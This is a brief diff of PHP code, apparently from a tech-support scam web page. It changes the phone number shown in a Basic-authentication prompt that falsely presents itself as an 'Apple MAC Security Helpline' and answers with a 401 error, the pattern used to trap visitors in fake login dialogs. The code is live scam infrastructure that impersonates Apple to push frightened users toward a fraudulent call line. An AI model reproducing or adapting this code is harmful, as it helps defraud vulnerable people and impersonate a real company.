@@ -14,7 +14,7 @@
             exit;
         } else {
 
-           header('WWW-Authenticate: Basic realm="Call Apple MAC Security Helpline +1-888-902-6064 (Toll Free) "');
+           header('WWW-Authenticate: Basic realm="Call Apple MAC Security Helpline +1-878-219-0531 (Toll Free) "');
            header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
  $sec = "0";
